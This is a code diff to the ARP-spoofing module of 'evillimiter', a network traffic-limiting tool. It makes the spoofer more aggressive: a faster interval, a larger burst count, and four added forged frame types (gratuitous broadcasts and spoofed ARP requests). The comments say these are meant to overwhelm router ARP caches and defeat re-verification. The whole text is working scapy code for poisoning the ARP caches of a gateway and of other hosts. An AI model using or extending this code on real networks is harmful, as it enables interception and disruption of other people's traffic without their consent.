@@ -15,7 +15,7 @@ from evillimiter.common.globals import BROADCAST
 
 
 class ARPSpoofer(object):
-    def __init__(self, interface, gateway_ip, gateway_mac, interval=0.5, burst_count=3):
+    def __init__(self, interface, gateway_ip, gateway_mac, interval=0.2, burst_count=10):
         self.interface = interface
         self.gateway_ip = gateway_ip
         self.gateway_mac = gateway_mac
@@ -24,11 +24,11 @@ class ARPSpoofer(object):
         self._attacker_mac = get_if_hwaddr(interface)
 
         # interval in seconds between spoofed ARP packet cycles
-        # default 0.5s (aggressive) to outpace 5G router ARP re-verification
+        # 0.2s = 5 cycles/sec — aggressive enough to outpace 5G router ARP re-verification
         self.interval = interval
 
         # number of times each ARP packet is sent per cycle
-        # burst helps overwhelm the router's ARP cache before it can re-learn
+        # 10× burst to overwhelm router's ARP cache before it can re-learn
         self.burst_count = burst_count
 
         # derive gateway's IPv6 link-local address from its MAC (EUI-64)
@@ -111,20 +111,51 @@ class ARPSpoofer(object):
     def _build_l2_packets(self, host):
         """
         Pre-construct full Layer-2 Ethernet frames for ARP poisoning.
-        Zero runtime route lookup or MAC resolution overhead.
+        6 packet types to aggressively poison both gateway and target:
+        - Unicast ARP reply to gateway (standard)
+        - Unicast ARP reply to target (standard)
+        - Gratuitous ARP broadcast claiming host.ip (overwhelm gateway)
+        - ARP request to gateway asking for gateway itself (forces reply, updates cache)
+        - Gratuitous ARP broadcast claiming gateway.ip (overwhelm target)
+        - ARP request to target asking for target itself
         """
         return [
-            # Poison gateway: "host.ip is at attacker's MAC"
+            # 1. Unicast reply → gateway: "host.ip is at attacker's MAC"
             Ether(src=self._attacker_mac, dst=self.gateway_mac) /
             ARP(op=2,
                 hwsrc=self._attacker_mac, psrc=host.ip,
                 hwdst=self.gateway_mac, pdst=self.gateway_ip),
 
-            # Poison target: "gateway_ip is at attacker's MAC"
+            # 2. Unicast reply → target: "gateway_ip is at attacker's MAC"
             Ether(src=self._attacker_mac, dst=host.mac) /
             ARP(op=2,
                 hwsrc=self._attacker_mac, psrc=self.gateway_ip,
-                hwdst=host.mac, pdst=host.ip)
+                hwdst=host.mac, pdst=host.ip),
+
+            # 3. Gratuitous ARP broadcast: "host.ip is at attacker's MAC" (forces all to update)
+            Ether(src=self._attacker_mac, dst=BROADCAST) /
+            ARP(op=2,
+                hwsrc=self._attacker_mac, psrc=host.ip,
+                hwdst=BROADCAST, pdst=host.ip),
+
+            # 4. ARP request → gateway: "who has gateway_ip? tell host.ip"
+            #    Forces gateway to process and update its cache with our src
+            Ether(src=self._attacker_mac, dst=self.gateway_mac) /
+            ARP(op=1,
+                hwsrc=self._attacker_mac, psrc=host.ip,
+                hwdst=self.gateway_mac, pdst=self.gateway_ip),
+
+            # 5. Gratuitous ARP broadcast: "gateway_ip is at attacker's MAC"
+            Ether(src=self._attacker_mac, dst=BROADCAST) /
+            ARP(op=2,
+                hwsrc=self._attacker_mac, psrc=self.gateway_ip,
+                hwdst=BROADCAST, pdst=self.gateway_ip),
+
+            # 6. ARP request → target: "who has target? tell gateway"
+            Ether(src=self._attacker_mac, dst=host.mac) /
+            ARP(op=1,
+                hwsrc=self._attacker_mac, psrc=self.gateway_ip,
+                hwdst=host.mac, pdst=host.ip),
         ]
 
     def _build_restore_packets(self, host):
